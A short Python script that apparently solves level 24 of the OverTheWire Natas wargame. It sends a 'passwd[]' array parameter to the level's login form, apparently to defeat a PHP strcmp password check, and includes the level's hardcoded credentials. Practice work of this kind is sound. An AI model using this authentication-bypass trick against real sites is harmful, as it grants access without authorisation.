import sys
import requests as req

username = "natas24"
password = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"
url = "http://%s.natas.labs.overthewire.org/" % username

data = {"passwd[]": ""}
s = req.session()

r = s.post(url, auth=(username, password), data=data)
print(r.text)
print(r.cookies)
print(r.headers)
print(s.proxies)
